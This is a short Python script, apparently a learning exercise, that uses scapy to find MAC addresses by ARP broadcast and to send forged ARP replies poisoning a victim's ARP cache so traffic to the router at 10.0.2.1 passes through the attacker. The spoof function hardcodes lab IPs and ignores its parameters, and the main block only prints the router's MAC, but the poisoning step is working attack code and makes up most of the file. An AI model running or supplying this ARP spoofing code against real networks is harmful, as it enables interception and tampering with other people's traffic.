#!/usr/bin/env python

"""
| Description:
    Spoofs router and victim MAC address using MITM attack.
| Version:
    2
| Notes:
    
| Algorithm:
     
| Variables:
    ip
    packet
    router_mac
"""

import scapy.all as scapy


def get_mac(ip):
    '''
    Creating ARP request packet sent to broadcast frame.
    Returns clients_list containing found IP and MAC addresses.
    '''
    # create ARP packet
    arp_request = scapy.ARP(pdst=ip)

    # create broadcast frame
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # encapsulate ARP packet in broadcast frame
    arp_request_broadcast = broadcast/arp_request

    # srp send/receive/packets with custom mac address
    # srp by default returns 2 list objects, were returning
    # first element of the list by appending  [0]
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # target ip, target mac, router ip
    packet = scapy.ARP(op=2, pdst="10.0.2.4", hwdst=target_mac, psrc="10.0.2.1")
    scapy.send(packet)


#--------------[ MAIN ]--------------


router_mac = get_mac("10.0.2.1")
print(router_mac)

